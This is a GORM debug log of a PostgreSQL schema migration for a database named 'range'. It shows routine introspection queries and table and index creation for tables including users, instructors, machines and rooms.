[0m[33m[5.498ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'operating_system_types'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.807ms] [34;1m[rows:-][0m SELECT * FROM "operating_system_types" LIMIT 5

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[7.982ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'operating_system_types' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[11.607ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'operating_system_types'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.535ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'operating_system_types'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.099ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'operating_system_types' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'operating_system_types' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.633ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'operating_system_types' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'operating_system_types' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.159ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'operating_system_types' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'operating_system_types' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.157ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'operating_system_types' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'operating_system_types' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.062ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'operating_system_types' AND column_name = 'type') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'operating_system_types' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.557ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'operating_system_types' AND indexname = 'idx_operating_system_types_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.619ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machines' AND table_type = 'BASE TABLE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[27.855ms] [34;1m[rows:0][0m CREATE TABLE "machines" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"image_name_or_id" text NOT NULL,"room_id" bigint,"course_machine_id" bigint,"operating_system_type_id" bigint,PRIMARY KEY ("id"),CONSTRAINT "fk_machines_operating_system_type" FOREIGN KEY ("operating_system_type_id") REFERENCES "operating_system_types"("id"),CONSTRAINT "fk_machines_room" FOREIGN KEY ("room_id") REFERENCES "rooms"("id"),CONSTRAINT "fk_machines_course_machine" FOREIGN KEY ("course_machine_id") REFERENCES "course_machines"("id"))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[13.458ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_machines_deleted_at" ON "machines" ("deleted_at")

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.829ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND table_type = 'BASE TABLE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.422ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.512ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'users'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.529ms] [34;1m[rows:-][0m SELECT * FROM "users" LIMIT 5

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[17.577ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[24.824ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.563ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'users'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.077ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[6.231ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.302ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.198ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.212ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'user_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.421ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'first_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.403ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'last_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.198ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'middle_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.158ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[9.181ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.292ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'password') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.289ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.304ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.141ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.969ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'users' AND indexname = 'idx_users_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.602ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND table_type = 'BASE TABLE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.381ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.368ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'instructors'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.585ms] [34;1m[rows:-][0m SELECT * FROM "instructors" LIMIT 5

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[7.370ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'instructors' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[14.510ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'instructors'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.573ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'instructors'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.128ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.140ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.119ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.120ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.097ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'account_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.054ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'user_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.859ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND constraint_name = 'fk_instructors_user'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.881ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'instructors' AND indexname = 'idx_instructors_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.901ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'instructors' AND indexname = 'idx_instructor_user' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[6.341ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND table_type = 'BASE TABLE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.410ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.998ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'rooms'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.684ms] [34;1m[rows:-][0m SELECT * FROM "rooms" LIMIT 5

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[19.135ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'rooms' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[15.045ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'rooms'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
